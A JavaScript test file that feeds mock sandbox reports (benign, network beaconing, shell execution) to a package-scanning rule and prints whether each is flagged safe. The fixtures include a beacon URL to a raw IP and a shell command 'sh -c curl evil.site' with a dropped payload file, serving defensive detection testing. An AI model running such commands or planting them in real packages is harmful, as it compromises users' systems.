// test/rule4.test.js

const rule4 = require("../services/rule4.behavioral-sandbox");

const testCases = [
  {
    name: "Benign package behavior",
    sandboxReport: {
      networkRequests: [],
      syscalls: ["open", "read"],
      fileWrites: [],
      executedCommands: []
    }
  },
  {
    name: "Network beaconing package",
    sandboxReport: {
      networkRequests: ["http://185.222.88.10/ping"],
      syscalls: ["connect"],
      fileWrites: [],
      executedCommands: []
    }
  },
  {
    name: "Shell execution detected",
    sandboxReport: {
      networkRequests: [],
      syscalls: ["execve"],
      fileWrites: ["/tmp/payload.bin"],
      executedCommands: ["sh -c curl evil.site"]
    }
  }
];

testCases.forEach(tc => {
  const findings = rule4.run({ sandboxReport: tc.sandboxReport });

  const safe = findings.every(f => f.severity !== "HIGH" && f.severity !== "CRITICAL");

  console.log(`${tc.name} → safe: ${safe}`);

  if (findings.length > 0) {
    console.log("  findings:", findings);
  }
});
